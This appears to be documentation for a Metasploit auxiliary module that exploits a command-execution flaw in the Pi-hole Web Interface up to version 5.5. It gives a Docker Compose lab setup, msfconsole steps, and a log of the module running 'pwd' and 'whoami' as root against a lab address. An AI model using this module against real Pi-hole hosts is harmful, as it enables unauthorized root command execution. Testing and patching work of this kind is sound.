## Vulnerable Application

This exploits a command execution in Pi-Hole Web Interface <= 5.5.
The Settings > API/Web inetrace page contains the field
Top Domains/Top Advertisers which is validated by a regex which does not properly
filter system commands, which can then be executed by calling the gravity
functionality.  However, the regex only allows a-z, 0-9, _.

### Docker Compose

Using the Docker compose file below, execute `docker compose up -d`
to get a vulnerable environment running.

```
version: "3"

# More info at https://github.com/pi-hole/docker-pi-hole/ and https://docs.pi-hole.net/
services:
  pihole:
    container_name: pihole
    image: pihole/pihole:v5.5
    ports:
      #- "53:53/tcp"
      #- "53:53/udp"
      #- "67:67/udp"
      - "192.168.2.199:80:80/tcp"
    environment:
      TZ: 'America/Chicago'
      WEBPASSWORD: ''
    # Volumes store your data between container upgrades
    volumes:
      - './etc-pihole/:/etc/pihole/'
      - './etc-dnsmasq.d/:/etc/dnsmasq.d/'
    # Recommended but not required (DHCP needs NET_ADMIN)
    #   https://github.com/pi-hole/docker-pi-hole#note-on-capabilities
    cap_add:
      - NET_ADMIN
    restart: unless-stopped
```

## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use auxiliary/admin/http/pihole_domains_api_exec`
4. Do: `set rhosts [ip]`
5. Do: `run`
6. You should get the output from the command.

## Options

### COMMAND

The command to run. This is VERY restrictive. Valid characters are `0-9`, `a-z`, `_`.
[Ref](https://github.com/pi-hole/AdminLTE/blob/v5.3.1/scripts/pi-hole/php/savesettings.php#L71). Defaults to `pwd`.

## Scenarios

### Pi-hole v5.2.4 with Web Interface 5.3.1 via Docker

```
[*] Processing pihole.rb for ERB directives.
resource (pihole.rb)> use auxiliary/admin/http/pihole_domains_api_exec
resource (pihole.rb)> set rhosts 192.168.2.199
rhosts => 192.168.2.199
resource (pihole.rb)> set verbose true
verbose => true
resource (pihole.rb)> run
[*] Running module against 192.168.2.199
[+] Web Interface Version Detected: 5.3.1
[*] Using token: YbGnWVA3ogVs0eLaKjEDGPaX8Zy1l5X3dxfHHSdy6r8=
[*] Sending payload request
[*] Forcing gravity pull
[+] /var/www/html/admin/scripts/pi-hole/php
[*] Auxiliary module execution completed
msf6 auxiliary(admin/http/pihole_domains_api_exec) > set command whoami
command => whoami
msf6 auxiliary(admin/http/pihole_domains_api_exec) > run
[*] Running module against 192.168.2.199

[+] Web Interface Version Detected: 5.3.1
[*] Using token: 9dtOO2bIndYSyJ1KsGYBa7pV5B4MToTQB1h2dmRfHk8=
[*] Sending payload request
[*] Forcing gravity pull
[+] root
[*] Auxiliary module execution completed
```
